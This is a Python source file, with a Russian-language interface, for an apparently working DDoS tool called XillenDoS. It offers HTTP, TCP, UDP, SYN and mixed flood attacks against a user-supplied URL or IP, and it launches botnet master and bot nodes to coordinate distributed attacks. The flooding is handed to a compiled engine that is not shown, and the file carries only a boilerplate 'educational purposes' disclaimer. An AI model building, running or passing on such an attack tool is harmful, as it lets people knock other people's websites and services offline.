#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import ctypes
import os
import sys
import time
import threading
import socket
import dns.resolver
import ipaddress
import random
import requests
from urllib.parse import urlparse
import colorama
from colorama import Fore, Back, Style
import logging
from datetime import datetime
import platform
import subprocess
import json

colorama.init()

class Colors:
    RED = Fore.RED
    GREEN = Fore.GREEN
    YELLOW = Fore.YELLOW
    BLUE = Fore.BLUE
    MAGENTA = Fore.MAGENTA
    CYAN = Fore.CYAN
    WHITE = Fore.WHITE
    BOLD = Style.BRIGHT
    UNDERLINE = Style.BRIGHT
    END = Style.RESET_ALL
    BG_RED = Back.RED
    BG_GREEN = Back.GREEN
    BG_YELLOW = Back.YELLOW

class AttackConfig(ctypes.Structure):
    _fields_ = [
        ("target", ctypes.c_char * 256),
        ("target_ip", ctypes.c_char * 256),
        ("port", ctypes.c_int),
        ("threads", ctypes.c_int),
        ("duration", ctypes.c_int),
        ("method", ctypes.c_int),
        ("use_proxy", ctypes.c_int),
        ("proxies", ctypes.c_char * 1024),
        ("verbose", ctypes.c_int),
        ("log_file", ctypes.c_char * 256)
    ]

class AttackStats(ctypes.Structure):
    _fields_ = [
        ("requests_sent", ctypes.c_uint64),
        ("errors", ctypes.c_uint64),
        ("successful_connections", ctypes.c_uint64),
        ("bytes_sent", ctypes.c_uint64),
        ("packets_sent", ctypes.c_uint64),
        ("rps", ctypes.c_double),
        ("uptime", ctypes.c_double)
    ]

class XillenDoS:
    def __init__(self):
        self.load_cpp_engine()
        self.engine = None
        self.running = False
        self.stats_thread = None
        self.setup_logging()
        
    def load_cpp_engine(self):
        try:
            if platform.system() == "Windows":
                lib_path = os.path.join("engine", "dos_engine.dll")
            else:
                lib_path = os.path.join("engine", "dos_engine.so")
            
            if not os.path.exists(lib_path):
                print(f"{Colors.RED}Ошибка: C++ движок не найден: {lib_path}{Colors.END}")
                print(f"{Colors.YELLOW}Запуск в режиме Python fallback...{Colors.END}")
                self.cpp_available = False
                return
                
            self.lib = ctypes.CDLL(lib_path)
            self.lib.create_engine.restype = ctypes.c_void_p
            self.lib.destroy_engine.argtypes = [ctypes.c_void_p]
            self.lib.set_config.argtypes = [ctypes.c_void_p, ctypes.POINTER(AttackConfig)]
            self.lib.start_attack.argtypes = [ctypes.c_void_p]
            self.lib.stop_attack.argtypes = [ctypes.c_void_p]
            self.lib.get_stats.restype = AttackStats
            self.lib.get_stats.argtypes = [ctypes.c_void_p]
            self.lib.is_running.restype = ctypes.c_int
            self.lib.is_running.argtypes = [ctypes.c_void_p]
            
            self.cpp_available = True
            print(f"{Colors.GREEN}✅ C++ движок загружен успешно!{Colors.END}")
            
        except Exception as e:
            print(f"{Colors.RED}Ошибка загрузки C++ движка: {e}{Colors.END}")
            print(f"{Colors.YELLOW}Запуск в режиме Python fallback...{Colors.END}")
            self.cpp_available = False
    
    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('xillen_dos.log', encoding='utf-8'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger('XillenDoS')
    
    def resolve_domain(self, domain):
        try:
            result = dns.resolver.resolve(domain, 'A')
            return str(result[0])
        except:
            return None
    
    def is_valid_ip(self, ip):
        try:
            ipaddress.ip_address(ip)
            return True
        except:
            return False
    
    def check_port_open(self, host, port, timeout=3):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((host, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def banner(self):
        banner = f"""
{Colors.RED}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║    ██╗  ██╗██╗██╗     ██╗     ███████╗███╗   ██╗            ║
║    ╚██╗██╔╝██║██║     ██║     ██╔════╝████╗  ██║            ║
║     ╚███╔╝ ██║██║     ██║     █████╗  ██╔██╗ ██║            ║
║     ██╔██╗ ██║██║     ██║     ██╔══╝  ██║╚██╗██║            ║
║    ██╔╝ ██╗██║███████╗███████╗███████╗██║ ╚████║            ║
║    ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═══╝            ║
║                                                              ║
║              ██████╗  ██████╗ ███████╗                      ║
║              ██╔══██╗██╔═══██╗██╔════╝                      ║
║              ██║  ██║██║   ██║███████╗                      ║
║              ██║  ██║██║   ██║╚════██║                      ║
║              ██████╔╝╚██████╔╝███████║                      ║
║              ╚═════╝  ╚═════╝ ╚══════╝                      ║
║                                                              ║
║           🔥 HYBRID PYTHON + C++ ENGINE 🔥                   ║
║                                                              ║
║  Author: t.me/Bengamin_Button | t.me/XillenAdapter          ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
{Colors.END}
"""
        print(banner)
    
    def menu(self):
        print(f"{Colors.CYAN}{Colors.BOLD}╔══════════════════════════════════════════════════════════════╗{Colors.END}")
        print(f"{Colors.CYAN}{Colors.BOLD}║                    XILLEN ATTACK METHODS                     ║{Colors.END}")
        print(f"{Colors.CYAN}{Colors.BOLD}╠══════════════════════════════════════════════════════════════╣{Colors.END}")
        print(f"{Colors.CYAN}║ 🔥 DISTRIBUTED DDoS SYSTEM (МАКСИМАЛЬНАЯ МОЩНОСТЬ!) 🔥 ║{Colors.END}")
        print(f"{Colors.CYAN}║                                                              ║{Colors.END}")
        print(f"{Colors.CYAN}║ 1. Master Node              - Запуск командного центра       ║{Colors.END}")
        print(f"{Colors.CYAN}║ 2. Bot Node                 - Подключение к ботнету          ║{Colors.END}")
        print(f"{Colors.CYAN}║ 3. Auto Deploy              - Автоматическое развертывание  ║{Colors.END}")
        print(f"{Colors.CYAN}║                                                              ║{Colors.END}")
        print(f"{Colors.CYAN}║ ⚡ SINGLE NODE DoS (Быстрые локальные атаки) ⚡            ║{Colors.END}")
        print(f"{Colors.CYAN}║                                                              ║{Colors.END}")
        print(f"{Colors.CYAN}║ 4. HTTP Flood Attack        - Базовый HTTP флуд             ║{Colors.END}")
        print(f"{Colors.CYAN}║ 5. TCP Flood Attack         - Базовый TCP флуд              ║{Colors.END}")
        print(f"{Colors.CYAN}║ 6. UDP Flood Attack         - Базовый UDP флуд              ║{Colors.END}")
        print(f"{Colors.CYAN}║ 7. SYN Flood Attack         - SYN пакет флуд                ║{Colors.END}")
        print(f"{Colors.CYAN}║ 8. Mixed Attack             - Смешанная атака               ║{Colors.END}")
        print(f"{Colors.CYAN}{Colors.BOLD}╚══════════════════════════════════════════════════════════════╝{Colors.END}")
    
    def get_target_info(self):
        print(f"\n{Colors.YELLOW}{Colors.BOLD}╔══════════════════════════════════════════════════════════════╗{Colors.END}")
        print(f"{Colors.YELLOW}{Colors.BOLD}║                    Конфигурация Цели                          ║{Colors.END}")
        print(f"{Colors.YELLOW}{Colors.BOLD}╚══════════════════════════════════════════════════════════════╝{Colors.END}")
        
        while True:
            target_input = input(f"{Colors.GREEN}Введите цель (URL/IP/домен): {Colors.END}")
            if target_input:
                if target_input.startswith(('http://', 'https://')):
                    parsed = urlparse(target_input)
                    self.target = parsed.hostname
                    self.port = parsed.port or (443 if parsed.scheme == 'https' else 80)
                else:
                    self.target = target_input
                    self.port = int(input(f"{Colors.GREEN}Введите порт (по умолчанию 80): {Colors.END}") or "80")
                
                print(f"{Colors.CYAN}Резолвинг домена...{Colors.END}")
                if self.is_valid_ip(self.target):
                    self.target_ip = self.target
                    self.logger.info(f"Цель: {self.target} (IP адрес)")
                else:
                    self.target_ip = self.resolve_domain(self.target)
                    if self.target_ip:
                        self.logger.info(f"Домен {self.target} резолвится в {self.target_ip}")
                    else:
                        self.logger.warning(f"Не удалось резолвить домен {self.target}")
                        self.target_ip = self.target
                
                print(f"{Colors.GREEN}Проверка доступности порта...{Colors.END}")
                if self.check_port_open(self.target_ip, self.port):
                    self.logger.info(f"Порт {self.port} открыт на {self.target_ip}")
                else:
                    self.logger.warning(f"Порт {self.port} закрыт или недоступен на {self.target_ip}")
                
                break
            else:
                print(f"{Colors.RED}Пожалуйста, введите корректную цель!{Colors.END}")

        self.threads = int(input(f"{Colors.GREEN}Количество потоков (по умолчанию 100): {Colors.END}") or "100")
        self.duration = int(input(f"{Colors.GREEN}Длительность атаки в секундах (по умолчанию 60): {Colors.END}") or "60")
    
    def create_config(self, method):
        config = AttackConfig()
        config.target = self.target.encode('utf-8')
        config.target_ip = self.target_ip.encode('utf-8')
        config.port = self.port
        config.threads = self.threads
        config.duration = self.duration
        config.method = method
        config.use_proxy = 0
        config.proxies = b""
        config.verbose = 1
        config.log_file = b"xillen_dos.log"
        return config
    
    def stats_monitor(self):
        start_time = time.time()
        while self.running:
            elapsed = time.time() - start_time
            if elapsed >= self.duration:
                self.running = False
                break
                
            if self.cpp_available and self.engine:
                stats = self.lib.get_stats(self.engine)
                print(f"\r{Colors.CYAN}Attack Progress: {Colors.YELLOW}{elapsed:.1f}s{Colors.CYAN}/{self.duration}s | "
                      f"{Colors.GREEN}Requests: {stats.requests_sent}{Colors.CYAN} | "
                      f"{Colors.RED}Errors: {stats.errors}{Colors.CYAN} | "
                      f"{Colors.MAGENTA}RPS: {stats.rps:.1f}{Colors.END}", end="")
            else:
                print(f"\r{Colors.CYAN}Attack Progress: {Colors.YELLOW}{elapsed:.1f}s{Colors.CYAN}/{self.duration}s{Colors.END}", end="")
            
            time.sleep(1)
    
    def start_cpp_attack(self, method):
        if not self.cpp_available:
            print(f"{Colors.RED}C++ движок недоступен!{Colors.END}")
            return False
        
        try:
            self.engine = self.lib.create_engine()
            config = self.create_config(method)
            self.lib.set_config(self.engine, ctypes.byref(config))
            
            print(f"\n{Colors.RED}{Colors.BOLD}╔══════════════════════════════════════════════════════════════╗{Colors.END}")
            print(f"{Colors.RED}{Colors.BOLD}║                    Starting C++ Attack                       ║{Colors.END}")
            print(f"{Colors.RED}{Colors.BOLD}╚══════════════════════════════════════════════════════════════╝{Colors.END}")
            
            print(f"{Colors.YELLOW}Цель: {Colors.WHITE}{self.target}:{self.port}{Colors.END}")
            print(f"{Colors.YELLOW}IP адрес: {Colors.WHITE}{self.target_ip}{Colors.END}")
            print(f"{Colors.YELLOW}Метод: {Colors.WHITE}{self.get_method_name(method)}{Colors.END}")
            print(f"{Colors.YELLOW}Потоков: {Colors.WHITE}{self.threads}{Colors.END}")
            print(f"{Colors.YELLOW}Длительность: {Colors.WHITE}{self.duration}s{Colors.END}")
            print(f"{Colors.GREEN}Движок: {Colors.WHITE}C++ (МАКСИМАЛЬНАЯ СКОРОСТЬ!){Colors.END}")
            
            print(f"\n{Colors.RED}{Colors.BOLD}Нажмите Ctrl+C для остановки атаки{Colors.END}")
            time.sleep(2)
            
            self.running = True
            self.lib.start_attack(self.engine)
            
            self.stats_thread = threading.Thread(target=self.stats_monitor)
            self.stats_thread.daemon = True
            self.stats_thread.start()
            
            try:
                while self.running and self.lib.is_running(self.engine):
                    time.sleep(0.1)
            except KeyboardInterrupt:
                self.running = False
                print(f"\n\n{Colors.RED}{Colors.BOLD}Атака остановлена пользователем!{Colors.END}")
            
            self.lib.stop_attack(self.engine)
            
            if self.stats_thread.is_alive():
                self.stats_thread.join(timeout=1)
            
            stats = self.lib.get_stats(self.engine)
            self.lib.destroy_engine(self.engine)
            
            print(f"\n{Colors.GREEN}{Colors.BOLD}Атака завершена!{Colors.END}")
            print(f"{Colors.CYAN}Всего запросов отправлено: {Colors.WHITE}{stats.requests_sent}{Colors.END}")
            print(f"{Colors.CYAN}Всего ошибок: {Colors.WHITE}{stats.errors}{Colors.END}")
            print(f"{Colors.CYAN}Успешных соединений: {Colors.WHITE}{stats.successful_connections}{Colors.END}")
            print(f"{Colors.CYAN}Байт отправлено: {Colors.WHITE}{stats.bytes_sent:,}{Colors.END}")
            print(f"{Colors.CYAN}Пакетов отправлено: {Colors.WHITE}{stats.packets_sent}{Colors.END}")
            print(f"{Colors.CYAN}Средний RPS: {Colors.WHITE}{stats.rps:.1f}{Colors.END}")
            
            self.logger.info(f"Атака завершена. Запросов: {stats.requests_sent}, Ошибок: {stats.errors}")
            return True
            
        except Exception as e:
            print(f"{Colors.RED}Ошибка C++ движка: {e}{Colors.END}")
            self.logger.error(f"Ошибка C++ движка: {e}")
            return False
    
    def get_method_name(self, method):
        methods = {
            1: "Master Node",
            2: "Bot Node", 
            3: "Auto Deploy",
            4: "HTTP Flood",
            5: "TCP Flood",
            6: "UDP Flood",
            7: "SYN Flood",
            8: "Mixed Attack"
        }
        return methods.get(method, "Unknown")
    
    def launch_master_node(self):
        print(f"\n{Colors.GREEN}🚀 Запуск Master Node (Командный центр)...{Colors.END}")
        print(f"{Colors.YELLOW}Master Node будет управлять всеми подключенными ботами{Colors.END}")
        
        try:
            master_script = os.path.join("distributed", "master_node.py")
            if os.path.exists(master_script):
                subprocess.Popen([sys.executable, master_script])
                print(f"{Colors.GREEN}✅ Master Node запущен!{Colors.END}")
                print(f"{Colors.CYAN}Порт команд: 1338{Colors.END}")
                print(f"{Colors.CYAN}Подключите боты к этому IP для координации атак{Colors.END}")
            else:
                print(f"{Colors.RED}❌ Master Node скрипт не найден!{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}Ошибка запуска Master Node: {e}{Colors.END}")
    
    def launch_bot_node(self):
        print(f"\n{Colors.GREEN}🤖 Запуск Bot Node (Подключение к ботнету)...{Colors.END}")
        
        master_ip = input(f"{Colors.GREEN}Введите IP Master Node (по умолчанию 127.0.0.1): {Colors.END}") or "127.0.0.1"
        master_port = int(input(f"{Colors.GREEN}Введите порт Master Node (по умолчанию 1338): {Colors.END}") or "1338")
        
        try:
            bot_script = os.path.join("distributed", "bot_node.py")
            if os.path.exists(bot_script):
                print(f"{Colors.GREEN}✅ Подключение к Master Node {master_ip}:{master_port}...{Colors.END}")
                subprocess.Popen([sys.executable, bot_script, master_ip, str(master_port)])
                print(f"{Colors.GREEN}✅ Bot Node запущен и подключен!{Colors.END}")
            else:
                print(f"{Colors.RED}❌ Bot Node скрипт не найден!{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}Ошибка запуска Bot Node: {e}{Colors.END}")
    
    def auto_deploy_system(self):
        print(f"\n{Colors.GREEN}🚀 Автоматическое развертывание DDoS системы...{Colors.END}")
        
        print(f"{Colors.YELLOW}Этот режим автоматически:")
        print(f"- Запустит Master Node")
        print(f"- Создаст несколько Bot Node")
        print(f"- Настроит координацию между ними{Colors.END}")
        
        confirm = input(f"\n{Colors.RED}Продолжить? (y/n): {Colors.END}")
        if confirm.lower() != 'y':
            return
            
        try:
            print(f"{Colors.GREEN}1. Запуск Master Node...{Colors.END}")
            self.launch_master_node()
            time.sleep(2)
            
            print(f"{Colors.GREEN}2. Запуск Bot Nodes...{Colors.END}")
            bot_count = int(input(f"{Colors.GREEN}Количество ботов для запуска (по умолчанию 3): {Colors.END}") or "3")
            
            for i in range(bot_count):
                print(f"{Colors.GREEN}Запуск Bot Node #{i+1}...{Colors.END}")
                self.launch_bot_node()
                time.sleep(1)
                
            print(f"{Colors.GREEN}✅ Система развернута!{Colors.END}")
            print(f"{Colors.CYAN}Master Node управляет {bot_count} ботами{Colors.END}")
            print(f"{Colors.CYAN}Используйте Master Node для координации атак{Colors.END}")
            
        except Exception as e:
            print(f"{Colors.RED}Ошибка развертывания: {e}{Colors.END}")
    
    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        self.banner()
        
        print(f"{Colors.YELLOW}{Colors.BOLD}⚠️  ВНИМАНИЕ: Этот инструмент предназначен только для образовательных целей! ⚠️{Colors.END}")
        print(f"{Colors.YELLOW}{Colors.BOLD}Используйте только на системах, которыми вы владеете или имеете явное разрешение на тестирование.{Colors.END}")
        print(f"{Colors.YELLOW}{Colors.BOLD}Авторы не несут ответственности за неправомерное использование этого инструмента.{Colors.END}\n")
        
        if self.cpp_available:
            print(f"{Colors.GREEN}🚀 C++ движок активен - МАКСИМАЛЬНАЯ ПРОИЗВОДИТЕЛЬНОСТЬ!{Colors.END}")
        else:
            print(f"{Colors.YELLOW}⚠️ C++ движок недоступен - используется Python fallback{Colors.END}")
        
        input(f"{Colors.GREEN}Нажмите Enter для продолжения...{Colors.END}")
        
        while True:
            os.system('cls' if os.name == 'nt' else 'clear')
            self.banner()
            self.menu()
            
            choice = input(f"\n{Colors.GREEN}Выберите метод атаки (1-8): {Colors.END}")
            
            if choice in ["1", "2", "3"]:
                if choice == "1":
                    self.launch_master_node()
                elif choice == "2":
                    self.launch_bot_node()
                elif choice == "3":
                    self.auto_deploy_system()
                    
                continue_choice = input(f"\n{Colors.GREEN}Вернуться в главное меню? (y/n): {Colors.END}")
                if continue_choice.lower() != 'y':
                    break
                    
            elif choice in ["4", "5", "6", "7", "8"]:
                method = int(choice)
                self.get_target_info()
                
                if self.start_cpp_attack(method):
                    continue_choice = input(f"\n{Colors.GREEN}Хотите запустить еще одну атаку? (y/n): {Colors.END}")
                    if continue_choice.lower() != 'y':
                        break
                else:
                    print(f"{Colors.RED}Не удалось запустить атаку!{Colors.END}")
                    time.sleep(2)
            else:
                print(f"{Colors.RED}Неверный выбор! Пожалуйста, выберите 1-8.{Colors.END}")
                time.sleep(2)

def signal_handler(sig, frame):
    print(f"\n{Colors.RED}{Colors.BOLD}Выход...{Colors.END}")
    sys.exit(0)

if __name__ == "__main__":
    import signal
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        tool = XillenDoS()
        tool.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}{Colors.BOLD}До свидания!{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}Ошибка: {e}{Colors.END}")
